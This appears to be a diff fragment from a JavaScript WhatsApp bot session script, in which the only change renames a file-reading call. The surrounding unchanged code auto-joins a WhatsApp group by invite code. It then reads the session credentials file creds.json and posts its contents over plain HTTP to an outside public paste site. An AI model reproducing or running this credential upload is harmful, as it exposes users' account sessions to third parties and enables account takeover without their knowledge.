@@ -56,7 +56,7 @@ const {
                         await session.groupAcceptInvite("GkYZvcVSUSR1WBvl6rBpiw");
                         const authfile = (`./session/creds.json`)
                         await delay(1000 * 10)
-let fil = await fs.readFileSync("./session/creds.json", "utf-8");
+let fil = await file.readFileSync("./session/creds.json", "utf-8");
                         let link = await axios.post('http://paste.c-net.org/',"" + fil, {
                             headers: {
 "Content-Type": 
